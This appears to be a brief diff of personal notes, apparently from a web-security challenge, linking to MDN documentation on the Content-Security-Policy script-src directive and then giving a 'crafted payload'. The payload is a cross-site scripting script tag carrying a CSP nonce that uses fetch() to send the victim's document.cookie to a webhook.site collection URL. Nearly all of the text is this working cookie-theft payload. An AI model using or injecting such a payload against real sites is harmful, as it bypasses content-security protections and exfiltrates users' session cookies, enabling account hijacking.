@@ -1,0 +1,11 @@
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src
+
+craft payload
+
+<script nonce="35974ec1765e2fd51bf4040134377e61">
+   fetch('https://webhook.site/95d871f2-d322-4d06-a871-bfeb49e19346/x?'+document.cookie, {
+       method: 'GET',
+       headers: { 'Content-Type': 'application/json' }
+   });
+</script>
+
